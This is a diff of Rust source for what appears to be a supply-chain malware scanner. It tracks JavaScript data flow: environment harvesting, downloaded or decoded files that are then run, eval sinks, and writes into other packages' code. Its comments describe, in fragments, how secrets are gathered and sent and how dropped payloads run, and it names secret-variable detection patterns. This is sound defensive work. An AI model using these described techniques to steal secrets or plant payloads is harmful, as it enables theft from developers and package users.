+                    if let (Some(Some(sc)), Some(Some(name))) = (parts.get(1 + climbed), parts.get(2 + climbed)) {
+                        if sc.first() == Some(&0x40) {
+                            pkg = crate::jsloads::npm_package(&pystr::join(&u("/"), &[sc.as_slice(), name.as_slice()]));
+                        }
+                    }
+                }
+            }
+        }
+        match pkg {
+            Some(p) => {
+                let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
+                self.sc_source(K_PKG, p, at, line, 0)
+            }
+            None => V::empty(),
+        }
+    }
+
+    /// Is `node` the script's own folder: Node's `__dirname` (no name of the script's), `import.meta.dirname`, or
+    /// `path.dirname(__filename)` (D-9b)?
+    fn sc_script_dir(&self, node: Option<NodeId>, scope: ScopeId) -> bool {
+        let Some(node) = node else { return false };
+        let a = self.a();
+        let node = a.unwrap(node);
+        let platform = |n: NodeId, name: &str| a.is_ident_named(n, name) && self.bind(n, scope).is_none();
+        match a.kind(node) {
+            Kind::Identifier => platform(node, "__dirname"),
+            Kind::MemberExpression => {
+                a.kind(a.at(node, jt::A)) == Kind::MetaProperty && a.prop_name(node).is_some_and(|p| eq(&p, "dirname"))
+            }
+            Kind::CallExpression => {
+                let callee = a.unwrap(a.at(node, jt::A));
+                let dirname = a.kind(callee) == Kind::MemberExpression
+                    && a.prop_name(callee).is_some_and(|p| eq(&p, "dirname"))
+                    && a.is_ident_named(a.at(callee, jt::A), "path");
+                dirname && a.list(node, jt::B).first().is_some_and(|&f| platform(a.unwrap(f), "__filename"))
+            }
+            _ => false,
+        }
+    }
+
+    /// Does a call's first argument name a JSON file, its text ending in a literal that ends in `.json`
+    /// (`require('./data.json')`, `require(path.join(dir, 'package.json'))`)? require parses such a file and runs
+    /// none of it.
+    fn sc_json_module(&self, node: NodeId) -> bool {
+        let a = self.a();
+        let first = match a.list(node, jt::B).first() {
+            Some(&f) => f,
+            None => return false,
+        };
+        let nd = &a.0.nodes[first as usize];
+        let sup = self.sup();
+        let lower = pystr::lower(pystr::rstrip_chars(sup.span(nd.start, nd.end), ") \t\r\n"));
+        [".json'", ".json\"", ".json`"].iter().any(|e| pystr::ends_with(&lower, e))
+    }
+
+    /// Is a call's callee a resolver of the platform's: `require.resolve` (of Node's `require`, not a name of the
+    /// script's, or of one `createRequire()` made, as ES modules do), `import.meta.resolve`? The model's
+    /// descriptions name no member of either.
+    fn sc_require_resolve(&self, node: NodeId, scope: ScopeId) -> bool {
+        let a = self.a();
+        let callee = a.unwrap(a.at(node, jt::A));
+        if a.kind(callee) != Kind::MemberExpression || !a.prop_name(callee).is_some_and(|p| eq(&p, "resolve")) {
+            return false;
+        }
+        let obj = a.unwrap(a.at(callee, jt::A));
+        if a.kind(obj) == Kind::MetaProperty {
+            return a.is_ident_named(a.at(obj, jt::A), "import") && a.is_ident_named(a.at(obj, jt::B), "meta");
+        }
+        if !a.is_ident_named(obj, "require") {
+            return false;
+        }
+        let made = |n: NodeId| {
+            let n = a.unwrap(n);
+            if a.kind(n) != Kind::CallExpression {
+                return false;
+            }
+            let f = a.unwrap(a.at(n, jt::A));
+            a.is_ident_named(f, "createRequire")
+                || (a.kind(f) == Kind::MemberExpression && a.prop_name(f).is_some_and(|p| eq(&p, "createRequire")))
+        };
+        match self.bind(obj, scope) {
+            None => true,
+            Some(b) => self.p.binds[b as usize].writes.iter().any(|w| matches!(w, Write::Init { node, .. } if made(*node))),
+        }
+    }
+
+    /// supply mode: does a path a write is given name a code file (its text, or what the name it is given holds
+    /// in this module, has a literal ending in `.js`, `.cjs` or `.mjs`)?
+    fn sc_code_path(&self, n: NodeId, scope: ScopeId) -> bool {
+        let sup = self.sup();
+        let a = self.a();
+        let code = |text: &[u32]| {
+            let lower = pystr::lower(text);
+            [".js'", ".js\"", ".js`", ".cjs'", ".cjs\"", ".cjs`", ".mjs'", ".mjs\"", ".mjs`"].iter().any(|e| pystr::contains(&lower, e))
+        };
+        let n = a.unwrap(n);
+        let (lo, hi) = (a.0.nodes[n as usize].start, a.0.nodes[n as usize].end);
+        if code(sup.span(lo, hi)) {
+            return true;
+        }
+        if a.kind(n) != Kind::Identifier {
+            return false;
+        }
+        let b = match self.bind(n, scope) {
+            Some(b) => b,
+            None => return false,
+        };
+        self.p.binds[b as usize].writes.iter().take(8).any(|w| match w {
+            Write::Init { node, .. } | Write::Assign { node, .. } => {
+                let nd = &a.0.nodes[*node as usize];
+                code(sup.span(nd.start, nd.end.min(nd.start + 4000)))
+            }
+            _ => false,
+        })
+    }
+
+    /// supply mode: a parameter a function writes to the file of `keys` at `at` is given `t` at a call (eval's
+    /// apply): a download, or code the script decodes or carves out, written there; a parameter of the caller's,
+    /// written there through it.
+    pub(super) fn sc_param_file(&mut self, t: &V, keys: Vec<PyStr>, at: u32) {
+        if t.src {
+            if let Some(sc) = t.sc.as_ref() {
+                record_written(&self.sup().written, keys.clone(), sc, at);
+            }
+        }
+        for &key in t.params.iter() {
+            self.pf_adds.push((key, keys.clone(), at));
+        }
     }
 
     /// supply mode: a call that runs a program (`spawn(p)`, `execSync(p +
@@ -1913,39 +2492,24 @@ impl<'p> Eval<'p> {
             return;
         }
         let sup = self.sup();
-        for (n, interp) in runs {
-            let keys = self.sc_path_keys(n, scope);
-            if let Some(w) = written_at(&sup.written, &keys) {
-                self.sc_dropped(&w, interp, at);
-                return;
-            }
+        let runs: Vec<(Vec<PyStr>, Option<PyStr>)> = runs.into_iter().map(|(n, interp)| (self.sc_path_keys(n, scope), interp)).collect();
+        if let Some((w, interp)) = run_of_written(&sup, &runs, &lines) {
+            self.sc_dropped(&w, interp, at);
+            return;
         }
-        // a constant command line: a written file it runs (`_DL_RUNNERS`)
-        if !lines.is_empty() {
-            let table = sup.written.borrow().clone();
-            for w in table {
-                for k in w.keys.iter().filter(|k| k.first() == Some(&0x3D)) {
-                    let seg = lines.iter().flat_map(|l| l.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A)).find(|seg| {
-                        crate::received::command_runs(sup.p(), seg, &k[1..])
-                    });
-                    if let Some(seg) = seg {
-                        let interp = pystr::split_ws(seg).first().and_then(|w| interp_name(w));
-                        self.sc_dropped(&w, interp, at);
-                        return;
-                    }
-                }
-            }
+        // (no write of it known yet: a callback's may be, by the end, D-2)
+        let mut pending = sup.runs.borrow_mut();
+        if !pending.iter().any(|r| r.at == at) {
+            pending.push(PendingRun { runs, lines, at });
         }
     }
 
     /// The finding for a written file run: what it held decoded or carved
     /// out of another file, or downloaded and run by an interpreter.
     fn sc_dropped(&mut self, w: &Written, interp: Option<PyStr>, at: u32) {
-        let interp = script_interp(w, interp);
-        if w.kinds & (K_DECODED | K_CARVED) == 0 && interp.is_none() {
-            return; // (a program downloaded and run: what installers of binaries do)
+        if let Some(out) = dropped_out(w, interp, at) {
+            self.findings.push(out);
         }
-        self.findings.push(Out::Dropped { at, from: w.at, kinds: w.kinds, what: w.what.clone(), interp });
     }
 
     /// Is a call's first argument a command line that downloads (curl or
@@ -2120,6 +2684,158 @@ impl<'p> Eval<'p> {
         out
     }
 
+    /// Is one of `fids` a method of a class made in several places (descs::Program::sc_made_widely)?
+    fn sc_widely_method(&mut self, fids: &[FnId]) -> bool {
+        fids.iter().any(|&f| match self.p.fns[f as usize].cls {
+            Some(c) => self.p.sc_made_widely(c),
+            None => false,
+        })
+    }
+
+    /// supply mode: `this`, in a method of a class made in several places: the method's receiver (RECV_INDEX), as
+    /// a parameter, which a call on an instance gives the instance's value (B-3: `r.setCode(t); r.run()`, where
+    /// `run` evals `this.c`, runs what `r` was given; B-1 keeps such a class's instances apart, so its `this.x` holds
+    /// nothing a call on an instance gives). Nothing elsewhere.
+    pub(super) fn sc_this_value(&mut self, scope: ScopeId) -> V {
+        let method = self.p.method_fn(scope);
+        let cls = self.p.fns[method as usize].cls;
+        match cls {
+            Some(c) if self.p.sc_made_widely(c) => V::param(method as u64 * PARAM_BASE + RECV_INDEX as u64, 0, false, 0),
+            _ => V::empty(),
+        }
+    }
+
+    /// A method call on an instance (not on `this`) of a class made in
+    /// several places (descs::Program::sc_made_widely)?
+    fn sc_instance_call(&mut self, callee: NodeId, fids: &[FnId]) -> bool {
+        if self.a().kind(self.a().at(callee, jt::A)) == Kind::ThisExpression {
+            return false;
+        }
+        fids.iter().any(|&f| match self.p.fns[f as usize].cls {
+            Some(c) => self.p.sc_made_widely(c),
+            None => false,
+        })
+    }
+
+    /// Is a call made on an instance from outside it — `new C(…)`, `s.m(…)`
+    /// — not on `this` (`this.m(…)`, `super(…)`, `super.m(…)`)? What a
+    /// method of a class made in several places is given there goes to
+    /// that instance, not to every instance's `this.x` (apply).
+    pub(super) fn sc_on_instance(&self, node: NodeId) -> bool {
+        if self.p.cfg.supply.is_none() {
+            return false;
+        }
+        let a = self.a();
+        match a.kind(node) {
+            Kind::NewExpression => true,
+            Kind::CallExpression => {
+                let callee = a.unwrap(a.at(node, jt::A));
+                match a.kind(callee) {
+                    Kind::Super => false,
+                    Kind::MemberExpression => !matches!(a.kind(a.at(callee, jt::A)), Kind::ThisExpression | Kind::Super),
+                    _ => true,
+                }
+            }
+            _ => false,
+        }
+    }
+
+    /// A for-in or for-of loop over the environment's variables whose body
+    /// is a test of them alone, one that selects some (`for (const k in
+    /// process.env) if (k.startsWith('VITE_')) env[k] = process.env[k]`):
+    /// what it reads is not the whole environment, unless the test excludes
+    /// some or names secrets (the `.filter` rule; the text follower's
+    /// _LD_ENV_SELECT_RE).
+    pub(super) fn sc_loop_selects_env(&self, st: NodeId, it: &V) -> bool {
+        if !it.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
+            return false;
+        }
+        let a = self.a();
+        // the loop's variables
+        let left = a.at(st, jt::A);
+        let pats: Vec<NodeId> = if a.kind(left) == Kind::VariableDeclaration {
+            a.list(left, jt::A).iter().map(|&d| a.at(d, jt::A)).collect()
+        } else {
+            vec![left]
+        };
+        let names: Vec<PyStr> =
+            pats.iter().flat_map(|&p| a.pattern_names(p)).map(|(id, _)| a.name(id).to_vec()).collect();
+        if names.is_empty() {
+            return false;
+        }
+        // its body: one if statement, no else
+        let mut body = a.at(st, jt::C);
+        if a.kind(body) == Kind::BlockStatement {
+            match a.list(body, jt::A) {
+                [only] => body = *only,
+                _ => return false,
+            }
+        }
+        if a.kind(body) != Kind::IfStatement || a.opt(body, jt::C).is_some() {
+            return false;
+        }
+        let test = a.at(body, jt::A);
+        // (a test of the loop's variables)
+        let mut stack = vec![test];
+        let mut reads = false;
+        while let Some(n) = stack.pop() {
+            if a.kind(n) == Kind::Identifier && names.iter().any(|x| x.as_slice() == a.name(n)) {
+                reads = true;
+                break;
+            }
+            stack.extend(a.kids(n));
+        }
+        if !reads {
+            return false;
+        }
+        self.sc_selects(test)
+    }
+
+    /// Does a test of the environment's variables select some, not exclude
+    /// some or name secrets (_LD_EXCLUDES_RE, _SH_SECRET_VAR_RE in its text)?
+    /// What the names it reads are given in this file counts as its text: a
+    /// list of patterns (`sensitivePatterns.some((p) => p.test(k))`, where
+    /// the list holds /TOKEN/ and /SECRET/), a parameter's default
+    /// (vite's `prefixes = 'VITE_'`).
+    pub(super) fn sc_selects(&self, test: NodeId) -> bool {
+        let sup = self.sup();
+        let p = sup.p();
+        let a = self.a();
+        let (lo, hi) = (a.0.nodes[test as usize].start, a.0.nodes[test as usize].end);
+        let cond = sup.span(lo, hi);
+        if p.re("_LD_EXCLUDES_RE").search(cond).is_some() || p.re("_SH_SECRET_VAR_RE").search(cond).is_some() {
+            return false;
+        }
+        // the names the test reads (not a member's name), bound outside it
+        let mut given: Vec<(u32, u32)> = Vec::new();
+        let mut seen: Vec<BindId> = Vec::new();
+        let mut stack = vec![test];
+        while let Some(n) = stack.pop() {
+            match a.kind(n) {
+                Kind::Identifier => {
+                    let b = self.p.mods[self.m as usize].bind_at[n as usize];
+                    if b == UNSET || b == GLOBAL || seen.contains(&b) || seen.len() >= 8 {
+                        continue;
+                    }
+                    seen.push(b);
+                    for w in self.p.binds[b as usize].writes.iter().take(8) {
+                        let node = match w {
+                            Write::Init { node, .. } | Write::Assign { node, .. } | Write::Param { node, .. } => *node,
+                            _ => continue,
+                        };
+                        let span = (a.0.nodes[node as usize].start, a.0.nodes[node as usize].end);
+                        if self.p.binds[b as usize].module == self.m && !(lo <= span.0 && span.1 <= hi) {
+                            given.push(span);
+                        }
+                    }
+                }
+                Kind::MemberExpression if !a.computed(n) => stack.push(a.at(n, jt::A)),
+                _ => stack.extend(a.kids(n)),
+            }
+        }
+        given.iter().all(|&(s, e)| p.re("_SH_SECRET_VAR_RE").search(sup.span(s, e.min(s + 4000))).is_none())
+    }
+
     /// `this.x` in a method of a class or an object literal: the binding
     /// the model keeps for that member (made when first met), or None.
     pub(super) fn sc_this_member(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
@@ -2156,6 +2872,9 @@ impl<'p> Eval<'p> {
             refs: Vec::new(),
             targets: None,
         });
+        if owner.0 == 1 {
+            self.p.sc_this_class.insert(bid, owner.1);
+        }
         self.p.sc_props.insert(key, bid);
         Some(bid)
     }
@@ -2217,10 +2936,30 @@ impl<'p> Eval<'p> {
                 }
             }
         }
-        // a member of `this`
+        // a member of `this` (and, in a method of a class made in several places, of the receiver: B-3)
         if !computed {
             if let Some(b) = self.sc_this_member(node, scope) {
-                return Some(self.read(b));
+                return Some(self.read(b).union(&obj.plain()));
+            }
+        }
+        // a copy of the environment, a value holding it or a parameter, read by a member's name (`{ ...process.env
+        // }`, `Object.assign({}, process.env)`, `{ env: process.env, path }`, a parameter whose default is
+        // process.env: the model keeps process.env's mark in none of them, and reads an object's members as the
+        // whole object): a variable's name is that variable, as process.env's own member is; a name that holds the
+        // environment (`env`, `environment`) is all of it; any other member is not the environment, and a
+        // parameter read so gives the function's return none of the environment a call gives it (MEMBER_KEY). With
+        // what else the value holds (D-16: prisma's `getApiBaseUrl(env = process.env)` reads
+        // `env.PRISMA_MANAGEMENT_API_URL`, its telemetry's `buildTelemetryEvent(payload, config, env)` reads
+        // `env.platform`; corepack's `localEnv.path` is a path)
+        let whole = obj.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0);
+        if !computed && (whole || !obj.params.is_empty()) {
+            if let Some(n) = name.as_deref().filter(|n| !eq(n, "length")) {
+                if env_var_name(n) {
+                    return Some(sc_through_member(obj).union(&self.sc_env_var(n, at, line)));
+                }
+                if !env_holder_name(n) {
+                    return Some(sc_through_member(obj));
+                }
             }
         }
         None
@@ -2256,7 +2995,10 @@ impl<'p> Eval<'p> {
             let shell = names
                 .iter()
                 .any(|n| is_one(n, &["child_process.exec", "child_process.execSync", "shelljs.exec", "execSync", "exec"]));
-            if !(shell && self.sc_fixed_program(node, scope)) {
+            // (a JSON file's path given require: it is parsed, and runs nothing; corepack's
+            // `require(path.join(tmpFolder, 'package.json'))` of what it downloaded, D-18)
+            let json = r.cat == LOAD_NAME && self.sc_json_module(node);
+            if !(shell && self.sc_fixed_program(node, scope)) && !json {
                 self.sc_sink(r.cat, &v, at);
             }
         }
@@ -2350,13 +3092,9 @@ impl<'p> Eval<'p> {
         // .filter(([k]) => k.startsWith('X_'))`) is not the whole of it, unless
         // the test excludes some or names secrets (the text follower's _LD_ENV_SELECT_RE)
         if member && named("filter") && recv.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
-            let sup = self.sup();
-            let a = self.a();
-            let list = a.list(node, jt::B);
-            if let (Some(&f), Some(&l)) = (list.first(), list.last()) {
-                let cond = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
-                let p = sup.p();
-                if p.re("_LD_EXCLUDES_RE").search(cond).is_none() && p.re("_SH_SECRET_VAR_RE").search(cond).is_none() {
+            let first = self.a().list(node, jt::B).first().copied();
+            if let Some(f) = first {
+                if self.sc_selects(f) {
                     return Ok(V::empty());
                 }
             }
@@ -2393,12 +3131,29 @@ impl<'p> Eval<'p> {
         let (fids, how) = (tg.0.clone(), tg.1);
         let definite = how == descs::How::Definite;
         let line = self.call_line(node);
+        // (a method of its own, called on a parameter: that member of the parameter, D-16: prisma's
+        // `env.readProjectPackageJson()`; a built-in one gives back what the parameter holds)
+        let own = member && name.as_deref().is_some_and(|n| !is_one(n, PASS_THROUGH) && !env_holder_name(n));
+        let held = if own { recv.plain().through_member() } else { recv.plain() };
         let mut v;
         if !fids.is_empty() {
+            // (a method of a class made in several places: `this` is the value it is called on, B-3)
+            if member && self.sc_widely_method(&fids) {
+                self.recv_val = Some(recv.plain());
+            }
             v = self.apply(node, &fids, args, spread, line, false);
+            self.recv_val = None;
             if !definite {
                 let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
-                v = v.union(&union_all(&plains)).union(&recv.plain());
+                v = v.union(&union_all(&plains)).union(&held);
+            }
+            // (an instance of a class made in several places is a container:
+            // what its methods are given it holds, what it holds they give back)
+            if member && self.sc_instance_call(callee, &fids) {
+                let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
+                let given = union_all(&plains);
+                v = v.union(&given).union(&recv.plain());
+                self.member_write(callee, &given, scope);
             }
         } else if name.as_deref().is_some_and(|n| is_in(CLEAN_RESULT, n)) {
             v = V::empty();
@@ -2407,13 +3162,17 @@ impl<'p> Eval<'p> {
             v = V::empty();
         } else {
             let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
-            v = union_all(&plains).union(&recv.plain());
+            v = union_all(&plains).union(&held);
             if !member {
                 v = v.union(&callee_val.plain());
             } else if named("join") || named("concat") {
                 v = v.with_built();
             }
+            // (a path in another package's folder, D-9)
+            v = v.union(&self.sc_pkg_path(node, &names, scope));
         }
+        // (a server holds nothing it is sent, nor what its handler returns: OBJ_SERVER, below)
+        let server = receiving && makes_server(&names);
         // callbacks of anything but the script's functions get what the call
         // holds, and what it receives (a request's callbacks, only that)
         if fids.is_empty() {
@@ -2421,24 +3180,51 @@ impl<'p> Eval<'p> {
             for a in args.iter().filter(|_| !receiving) {
                 held = held.union(&a.plain());
             }
+            // (what a server the script made is sent: its events' arguments; an
+            // event named by anything but a literal may be one of them)
+            let data_event = || -> bool {
+                let a = self.a();
+                match a.list(node, jt::B).first() {
+                    Some(&e) if a.is_string(e) => a.str_value(e).is_some_and(|v| is_one(v, SERVER_DATA_EVENTS)),
+                    _ => true,
+                }
+            };
+            if member
+                && recv.kind & OBJ_SERVER != 0
+                && name.as_deref().is_some_and(|n| is_one(n, SERVER_EVENTS))
+                && data_event()
+            {
+                let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
+                held = held.union(&self.sc_source(K_RECEIVED, u("a server"), at, line, 0));
+            }
             let cb = self.sc_callbacks(node, &held, scope);
-            v = v.union(&cb.plain());
+            if !server {
+                v = v.union(&cb.plain());
+            }
             // a runner given as the callback runs it: `.then(eval)`
             if held.tainted() {
                 self.sc_runner_args(node, &held, scope);
             }
         }
-        v = v.union(&got);
-        // a container a value is put into holds it
-        if member && (named("push") || named("unshift")) {
-            let obj = self.a().at(callee, jt::A);
-            if self.a().kind(obj) == Kind::Identifier {
-                if let Some(b) = self.bind(obj, scope) {
-                    if self.p.binds[b as usize].kind != BindKind::Import {
-                        let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
-                        self.write(b, union_all(&plains), false);
-                    }
-                }
+        if !server {
+            v = v.union(&got);
+        }
+        // a container a value is put into holds it: an array's push, unshift and a splice's items, a Map's, a
+        // Headers' or a URLSearchParams' set, a Set's add, a FormData's, a URLSearchParams' or a Headers' append, a
+        // fill; and the target of `Object.assign(target, …)`, `Object.defineProperty`, `Reflect.set`. (D-3: the tree
+        // knew an array's push and unshift alone, so `fd.append('e', env)` sent nothing.) A container a name holds,
+        // or a member's (`o.list.push(x)`, `this.items.push(x)`: the member's own, sc_member_container, D-3b)
+        if member && name.as_deref().is_some_and(|n| is_one(n, COLLECTS)) {
+            let from = if named("splice") { 2 } else { 0 };
+            let plains: Vec<V> = args.iter().skip(from).map(|a| a.plain()).collect();
+            let obj = self.a().unwrap(self.a().at(callee, jt::A));
+            self.sc_put_into(obj, union_all(&plains), scope);
+        }
+        if names.iter().any(|n| is_one(n, PUTS_INTO_FIRST)) {
+            if let Some(&target) = self.a().list(node, jt::B).first() {
+                let plains: Vec<V> = args.iter().skip(1).map(|a| a.plain()).collect();
+                let target = self.a().unwrap(target);
+                self.sc_put_into(target, union_all(&plains), scope);
             }
         }
         // a decoder: what it returns is data the script decodes (`atob(x)`,
@@ -2457,6 +3243,9 @@ impl<'p> Eval<'p> {
         if makes_client(&names) {
             mark |= OBJ_CLIENT;
         }
+        if server {
+            mark |= OBJ_SERVER;
+        }
         if member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_CHAIN)) {
             mark |= OBJ_CONN;
         }
@@ -2470,6 +3259,108 @@ impl<'p> Eval<'p> {
             }
         }
         Ok(v)
+    }
+
+    /// supply mode: `v` put into `obj` (a container's receiver, an `Object.assign` target) when it is a name: its
+    /// binding holds it (not an import's); a member's container when it is a member (sc_member_container, D-3b).
+    /// Into a member of `this`, what the function holds of its own parameters is not put: from each caller it would
+    /// be what that caller gives, and a class's container that keeps what its method is given (a recorder's
+    /// `record(type, detail) { this._events.push(new LoaderEvent(type, detail)) }`) held everything every caller
+    /// recorded, a hub that joined unrelated flows (monaco-editor's loader: a plugin's `load` read as a download
+    /// reached its check that eval runs, `self.eval(policy.createScript('', 'true'))`).
+    fn sc_put_into(&mut self, obj: NodeId, v: V, scope: ScopeId) {
+        match self.a().kind(obj) {
+            Kind::Identifier => {
+                if let Some(b) = self.bind(obj, scope) {
+                    if self.p.binds[b as usize].kind != BindKind::Import {
+                        self.write(b, v, false);
+                    }
+                }
+            }
+            Kind::MemberExpression => {
+                let this = self.a().kind(self.a().at(obj, jt::A)) == Kind::ThisExpression;
+                if let Some(b) = self.sc_member_container(obj, scope) {
+                    let v = if this { v.within(&BTreeSet::new()) } else { v };
+                    if v.tainted() {
+                        self.write(b, v, false);
+                    }
+                }
+            }
+            _ => {}
+        }
+    }
+
+    /// supply mode: a member as a container of its own (D-3b): `this.items` (a member of `this`, sc_this_member) or
+    /// `o.list`, a name's static member (not an import's), a binding the function that holds the name holds, shared
+    /// as the name is. What is put into it (`o.list.push(x)`, `Object.assign(this.opts, …)`) is held apart from the
+    /// object, as an assignment to a member of `this` is: put into the object that holds it, it reached every member
+    /// read of that object, and joined unrelated flows in large bundles (vite's, monaco-editor's loader).
+    pub(super) fn sc_member_container(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
+        let (obj, name) = {
+            let a = self.a();
+            if a.kind(member) != Kind::MemberExpression || a.computed(member) {
+                return None;
+            }
+            (a.at(member, jt::A), a.prop_name(member)?)
+        };
+        match self.a().kind(obj) {
+            Kind::ThisExpression => self.sc_this_member(member, scope),
+            Kind::Identifier => {
+                let b = self.bind(obj, scope)?;
+                let held = &self.p.binds[b as usize];
+                if held.kind == BindKind::Import {
+                    return None;
+                }
+                let key = (5u8, b, name.clone());
+                if let Some(&got) = self.p.sc_props.get(&key) {
+                    return Some(got);
+                }
+                let (fid, shared, module) = (held.fid, held.shared, held.module);
+                let mut full = held.name.clone();
+                full.push(0x2E);
+                full.extend_from_slice(&name);
+                let bid = self.p.binds.len() as BindId;
+                self.p.binds.push(Bind {
+                    bid,
+                    name: full,
+                    kind: BindKind::Var,
+                    fid,
+                    writes: Vec::new(),
+                    shared,
+                    module,
+                    refs: Vec::new(),
+                    targets: None,
+                });
+                self.p.sc_props.insert(key, bid);
+                Some(bid)
+            }
+            _ => None,
+        }
+    }
+
+    /// supply mode: what a name's static member holds as a container (D-3b), when the module puts anything into a
+    /// member of that name as written (collected_members); None for any other member.
+    pub(super) fn sc_member_held(&mut self, node: NodeId, scope: ScopeId) -> Option<V> {
+        {
+            let a = self.a();
+            if a.computed(node) || a.kind(a.at(node, jt::A)) != Kind::Identifier {
+                return None;
+            }
+        }
+        let m = self.m;
+        if !self.p.sc_collected.contains_key(&m) {
+            let got = collected_members(&self.a());
+            self.p.sc_collected.insert(m, got);
+        }
+        if self.p.sc_collected[&m].is_empty() {
+            return None;
+        }
+        let name = self.a().prop_name(node)?;
+        if !self.p.sc_collected[&m].contains(&name) {
+            return None;
+        }
+        let b = self.sc_member_container(node, scope)?;
+        Some(self.read(b))
     }
 
     /// Is the call a decoder: `atob`, zlib's synchronous decompressions, a
@@ -2634,20 +3525,37 @@ pub struct Facts {
     /// the first file the script writes, then runs, holding code or a
     /// program it decodes, carves out of another file or downloads
     pub dropped: Option<DropRun>,
+    /// the code files it writes in other packages' folders: (the write's
+    /// line, the package), in the text's order (D-9)
+    pub rewrote: Vec<(usize, PyStr)>,
+}
+
+/// Why the tree said nothing about a text.
+#[derive(Clone, Debug, PartialEq)]
+pub enum Unread {
+    /// the parser refused it (JavaScript's reading, the first tried: its line and reason), and TypeScript's too
+    Refused(usize, PyStr),
+    /// over MAX_FILE, or past the pass's budget
+    Other,
 }
 
 thread_local! {
-    /// The last text read and what the tree said (None: it could not say):
-    /// the tests ask for a text's send, then for its received code.
-    static LAST: std::cell::RefCell<Option<(Vec<u32>, Option<Rc<Facts>>)>> = const { std::cell::RefCell::new(None) };
+    /// The last text read and what the tree said (Err: why it could not
+    /// say): the tests ask for a text's send, then for its received code.
+    static LAST: std::cell::RefCell<Option<(Vec<u32>, Result<Rc<Facts>, Unread>)>> = const { std::cell::RefCell::new(None) };
 }
 
 /// The tree's facts about a JavaScript text, or None when it could not say
 /// (a text the parser doesn't read, over 2 MB, or past the pass's budget):
 /// the text followers answer then.
 pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
+    facts_or_why(text).ok()
+}
+
+/// facts(), or why there are none.
+fn facts_or_why(text: &[u32]) -> Result<Rc<Facts>, Unread> {
     if text.len() > MAX_FILE {
-        return None;
+        return Err(Unread::Other);
     }
     if let Some(hit) = LAST.with(|l| l.borrow().as_ref().filter(|(t, _)| t.as_slice() == text).map(|(_, f)| f.clone())) {
         return hit;
@@ -2656,6 +3564,42 @@ pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
     let got = crate::api::on_own_stack(move || facts_here(&owned)).map(Rc::new);
     LAST.with(|l| *l.borrow_mut() = Some((text.to_vec(), got.clone())));
     got
+}
+
+/// The parser's refusal of a JavaScript text whose tree the supply-chain tests read (its line and reason): the
+/// tests that read the tree then had only the text followers (JS-PARSE-STRICT: a package file the parser refuses
+/// is said in the report). None when the tree was read, or not for that reason. Asked before the tests, it reads the
+/// text once for them (facts' cache).
+pub fn refusal(text: &[u32]) -> Option<(usize, PyStr)> {
+    match facts_or_why(text) {
+        Err(Unread::Refused(line, reason)) => Some((line, reason)),
+        _ => None,
+    }
+}
+
+/// refusal() by the parse alone, without the model's reading: what a host asks of a text another test read on its
+/// tree (an install script's: the registry's `js_refusal`).
+pub fn parse_refusal(text: &[u32]) -> Option<(usize, PyStr)> {
+    if text.len() > MAX_FILE {
+        return None;
+    }
+    let owned = text.to_vec();
+    crate::api::on_own_stack(move || supply_tree(&owned).err())
+}
+
+/// The tree the model reads for a JavaScript text, or the parser's refusal of it (the JavaScript reading's line and
+/// reason, when TypeScript's refuses it too).
+fn supply_tree(text: &[u32]) -> Result<crate::jsparse::tree::Tree, (usize, PyStr)> {
+    match crate::jsparse::parse_file(&u("script.js"), text) {
+        // (F-12: an HTML-like `<!--` after code, a comment to V8, is `<` `!` `--` to tsc, and a TypeScript file's
+        // text is read here as JavaScript first: what the comment hides may be code tsc runs. Then the text is read
+        // as tsc reads it, which sees that code, when that reading parses; when it does not, no runtime runs it
+        // so, and the comment's reading stands.)
+        Ok(t) if t.html_after_code => Ok(crate::jsparse::parse_with(text, false, true, false).unwrap_or(t)),
+        Ok(t) => Ok(t),
+        // (TypeScript, which the hosts hand as JavaScript)
+        Err(e) => crate::jsparse::parse_file(&u("script.ts"), text).map_err(|_| (e.line as usize, e.reason)),
+    }
 }
 
 /// The strongest send of local data in a JavaScript text, read on its tree.
@@ -2685,17 +3629,17 @@ pub fn dropped_run(text: &[u32]) -> Option<Option<DropRun>> {
     facts(text).map(|f| f.dropped.clone())
 }
 
-fn facts_here(text: &[u32]) -> Option<Facts> {
+/// The code files a JavaScript text writes in other packages' folders (D-9),
+/// read on its tree: Some((line, package) in the text's order), or None when
+/// the tree could not say.
+pub fn rewrote(text: &[u32]) -> Option<Vec<(usize, PyStr)>> {
+    facts(text).map(|f| f.rewrote.clone())
+}
+
+fn facts_here(text: &[u32]) -> Result<Facts, Unread> {
     let pack = crate::pack::current();
     let path = u("script.js");
-    let tree = match crate::jsparse::parse_file(&path, text) {
-        Ok(t) => t,
-        // (TypeScript, which the hosts hand as JavaScript)
-        Err(_) => match crate::jsparse::parse_file(&u("script.ts"), text) {
-            Ok(t) => t,
-            Err(_) => return None,
-        },
-    };
+    let tree = supply_tree(text).map_err(|(line, reason)| Unread::Refused(line, reason))?;
     let sup = Rc::new(Supply::new(pack, text));
     let mut cfg = Config::new(&[], &[], &[], &[]);
     cfg.supply = Some(sup.clone());
@@ -2707,13 +3651,16 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
     let mut findings: Vec<Out> = Vec::new();
     let notes = fixpoint(&mut prog, &mut findings);
     if notes.iter().any(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
-        return None;
+        return Err(Unread::Other);
     }
+    let late = late_drops(&sup, &findings);
+    findings.extend(late);
     // the strongest send: data over what only an address holds, a harvest
     // over other data, then the first; the first received code
     let mut best: Option<((bool, bool, u32), &'static str, PyStr)> = None;
     let mut first: Option<(u32, &'static str)> = None;
     let mut decoded: Vec<(usize, usize)> = Vec::new();
+    let mut rewrote: Vec<(u32, PyStr)> = Vec::new();
